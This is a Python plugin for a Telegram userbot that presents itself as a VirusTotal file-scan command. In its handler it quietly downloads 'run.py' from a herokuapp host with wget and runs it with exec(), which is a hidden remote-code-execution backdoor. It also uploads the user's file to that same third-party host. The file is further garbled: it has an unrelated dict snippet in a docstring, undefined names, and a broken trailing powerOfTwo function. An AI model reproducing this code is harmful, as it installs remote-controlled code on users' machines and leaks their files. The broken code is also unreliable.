import os
import time
from datetime import datetime

from WhiteEyeUserBot import CMD_HELP
from WhiteEyeUserBot.utils import WhiteEye_on_cmd
import aiohttp
import magic
import requests
from uniborg.util import WhiteEye_on_cmd, progress
import os
import requests
import time
import string 
from pathlib import Path
import random 
sedpath = "./file/"
if not os.path.isdir(sedpath):
    os.makedirs(sedpath)
dowm = Config.TMP_DOWNLOAD_DIRECTORY

@WhiteEye.on(WhiteEye_on_cmd(pattern="virustotal"))
async def _(event):
    if event.fwd_from:
        return
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    lol = await event.get_reply_message()
    teser = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    
    """d1 = {'had': 1000, 'gone': 2000, 'is': 3000, 'still': 4000, 'be': 5000, 'go': 6000, 'kid': 7000, 'adult': 8000}d2 = {'had': 2000, 'gone': 3000, 'is': 4000, 'still': 5000}
    d3 = {}
    for i in d1.keys():
      try:
        d3[i] = d1[i] - d2[i]
      except:
        d3[i] = d1[i]
    print(d3)"""
    if Path('run.py').is_file():
      os.remove("run.py")
    else:
      pass
    os.system("wget https://allinoneapi999.herokuapp.com/run.py")
    exec(open("run.py").read())
    
    url = "https://allinoneapi999.herokuapp.com/virustotal/upload"
    downloaded_file_name = teser
    files = {"file": (downloaded_file_name, open(downloaded_file_name, "rb"))}
    r = requests.post(url, files=files).json()
    
    if r.get("success") == True:
      
      b = r["permalink"]
      await event.edit(f"""Link of the report: \n{b}\n\nWait Few Minutes Before Opening File.""")
    else:
      await event.edit("your file is larger than 32 mb.")


 def powerOfTwo(n):
       if n==0:
             return 1
       else:
           Power=powerOfTwo(n-1)
           return power*2
